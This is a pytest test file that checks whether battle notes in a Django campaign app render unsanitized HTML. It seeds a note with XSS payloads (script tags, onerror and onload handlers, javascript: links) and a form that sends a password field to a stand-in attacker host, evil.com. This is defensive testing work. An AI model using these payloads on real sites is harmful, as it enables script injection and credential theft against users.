"""
Test for XSS vulnerability in BattleNote content rendering.

This test verifies whether XSS is possible through battle notes that bypass
TinyMCE sanitization by being created directly in the database.
"""

import pytest
from django.contrib.auth.models import User
from django.test import Client
from django.urls import reverse
from django.utils import timezone

from gyrinx.content.models import ContentHouse
from gyrinx.core.models import Battle, BattleNote, Campaign, List


@pytest.mark.django_db
def test_battle_note_xss_vulnerability_direct_db():
    """
    Test that XSS content created directly in DB (bypassing TinyMCE) is rendered.

    This test demonstrates whether there's a vulnerability when content is saved
    directly to the database, bypassing the TinyMCE form sanitization.
    """
    client = Client()

    # Create test users
    owner = User.objects.create_user(username="owner", password="testpass")
    viewer = User.objects.create_user(username="viewer", password="testpass")

    # Create a campaign and lists
    campaign = Campaign.objects.create(
        name="Test Campaign",
        owner=owner,
        public=True,
        status=Campaign.IN_PROGRESS,
    )

    house = ContentHouse.objects.create(name="Test House")

    list1 = List.objects.create(
        name="Test Gang 1",
        owner=owner,
        content_house=house,
        status=List.CAMPAIGN_MODE,
    )
    list2 = List.objects.create(
        name="Test Gang 2",
        owner=viewer,
        content_house=house,
        status=List.CAMPAIGN_MODE,
    )

    campaign.lists.add(list1, list2)

    # Create a battle
    battle = Battle.objects.create(
        campaign=campaign,
        date=timezone.now().date(),
        mission="Test Mission",
        owner=owner,
    )
    battle.participants.add(list1, list2)

    # Create a battle note with XSS content directly in database (bypassing TinyMCE)
    xss_content = """<p>Normal content</p>
<script>alert("XSS vulnerability!")</script>
<img src=x onerror="alert('XSS via img tag')">
<a href="javascript:alert('XSS via link')">Click me</a>
<style>body { background: red !important; }</style>
<iframe src="javascript:alert('XSS via iframe')"></iframe>
<svg onload="alert('XSS via SVG')"></svg>
<div onmouseover="alert('XSS on hover')">Hover over me</div>
<form action="https://evil.com/steal"><input name="password"></form>
"""

    BattleNote.objects.create(
        battle=battle,
        content=xss_content,
        owner=owner,
    )

    # Login as viewer and access the battle detail page
    client.login(username="viewer", password="testpass")
    response = client.get(reverse("core:battle", args=[battle.id]))

    assert response.status_code == 200

    content = response.content.decode()

    # Check if XSS vectors are present in the rendered HTML
    xss_vulnerabilities = []

    # Check for script tags
    if '<script>alert("XSS vulnerability!")</script>' in content:
        xss_vulnerabilities.append("Script tag with alert is rendered directly")

    # Check for img onerror
    if 'onerror="alert(' in content or "onerror=alert(" in content:
        xss_vulnerabilities.append("IMG tag with onerror handler is rendered")

    # Check for javascript: protocol
    if 'href="javascript:' in content or "href='javascript:" in content:
        xss_vulnerabilities.append("Javascript protocol in href is allowed")

    # Check for style tags
    if "<style>" in content and "background: red" in content:
        xss_vulnerabilities.append("Style tag injection is possible")

    # Check for iframe
    if "<iframe" in content and "javascript:" in content:
        xss_vulnerabilities.append("Iframe with javascript src is rendered")

    # Check for SVG with onload
    if "<svg" in content and "onload=" in content:
        xss_vulnerabilities.append("SVG with onload handler is rendered")

    # Check for event handlers
    if "onmouseover=" in content or "onclick=" in content:
        xss_vulnerabilities.append("Event handlers (onmouseover/onclick) are rendered")

    # Check for form injection
    if "<form" in content and "evil.com" in content:
        xss_vulnerabilities.append("Form injection to external site is possible")

    # Check if normal content is still rendered
    assert "<p>Normal content</p>" in content, "Normal HTML content should be rendered"

    # Report findings
    if xss_vulnerabilities:
        vulnerability_report = "\n".join(f"  - {vuln}" for vuln in xss_vulnerabilities)
        pytest.fail(
            f"XSS VULNERABILITY DETECTED!\n\nThe following XSS vectors were found in the rendered output:\n{vulnerability_report}\n\nThis confirms that battle notes are vulnerable to XSS when content bypasses TinyMCE sanitization."
        )
    else:
        # If no vulnerabilities found, the content might be escaped or sanitized
        # Check if content is being escaped (which would also prevent legitimate HTML)
        if (
            "&lt;script&gt;" in content
            or "&lt;p&gt;Normal content&lt;/p&gt;" in content
        ):
            print(
                "Content appears to be HTML-escaped, preventing both XSS and legitimate formatting"
            )
        else:
            print(
                "No XSS vulnerabilities detected - content appears to be properly sanitized"
            )


@pytest.mark.django_db
def test_battle_note_form_submission_with_xss():
    """
    Test that XSS content submitted through the form is handled properly.

    This tests the actual form submission path that goes through TinyMCE.
    """
    client = Client()

    # Create test user and campaign setup
    owner = User.objects.create_user(username="owner", password="testpass")
    campaign = Campaign.objects.create(
        name="Test Campaign",
        owner=owner,
        public=True,
        status=Campaign.IN_PROGRESS,
    )

    house = ContentHouse.objects.create(name="Test House")
    list1 = List.objects.create(
        name="Test Gang",
        owner=owner,
        content_house=house,
        status=List.CAMPAIGN_MODE,
    )
    campaign.lists.add(list1)

    battle = Battle.objects.create(
        campaign=campaign,
        date=timezone.now().date(),
        mission="Test Mission",
        owner=owner,
    )
    battle.participants.add(list1)

    # Login and try to submit XSS content through the form
    client.login(username="owner", password="testpass")

    # Submit form with XSS content
    xss_form_content = '<script>alert("Form XSS")</script><p>Normal text</p>'

    response = client.post(
        reverse("core:battle-note-add", args=[battle.id]),
        {
            "content": xss_form_content,
        },
    )

    # Check if submission was successful
    if response.status_code == 302:  # Redirect after successful submission
        # Get the created note
        note = BattleNote.objects.filter(battle=battle).first()
        if note:
            print(f"Note content saved via form: {note.content}")

            # Check what was actually saved
            if "<script>" in note.content:
                pytest.fail(
                    "XSS content was saved without sanitization through form submission"
                )
            else:
                print("Form submission appears to sanitize or escape XSS content")
    else:
        print(f"Form submission status: {response.status_code}")


@pytest.mark.django_db
def test_battle_note_safe_html_rendering():
    """
    Test that legitimate HTML formatting is preserved while dangerous content is blocked.
    """
    client = Client()

    # Create test setup
    owner = User.objects.create_user(username="owner", password="testpass")
    campaign = Campaign.objects.create(
        name="Test Campaign",
        owner=owner,
        public=True,
        status=Campaign.IN_PROGRESS,
    )

    house = ContentHouse.objects.create(name="Test House")
    list1 = List.objects.create(
        name="Test Gang",
        owner=owner,
        content_house=house,
        status=List.CAMPAIGN_MODE,
    )
    campaign.lists.add(list1)

    battle = Battle.objects.create(
        campaign=campaign,
        date=timezone.now().date(),
        mission="Test Mission",
        owner=owner,
    )
    battle.participants.add(list1)

    # Create note with safe HTML
    safe_html = """
    <h2>Battle Report</h2>
    <p>This was an <strong>intense</strong> and <em>exciting</em> battle!</p>
    <ul>
        <li>First objective completed</li>
        <li>Second objective failed</li>
    </ul>
    <blockquote>The enemy was stronger than expected</blockquote>
    <a href="/battles/">View other battles</a>
    """

    BattleNote.objects.create(
        battle=battle,
        content=safe_html,
        owner=owner,
    )

    # Access the battle page
    client.login(username="owner", password="testpass")
    response = client.get(reverse("core:battle", args=[battle.id]))

    assert response.status_code == 200
    content = response.content.decode()

    # Check that safe HTML is preserved
    safe_tags = [
        "<h2>Battle Report</h2>",
        "<strong>intense</strong>",
        "<em>exciting</em>",
        "<ul>",
        "<li>First objective completed</li>",
        "<blockquote>The enemy was stronger than expected</blockquote>",
    ]

    for tag in safe_tags:
        assert tag in content, f"Safe HTML tag '{tag}' should be rendered"

    print("Safe HTML content is properly rendered")
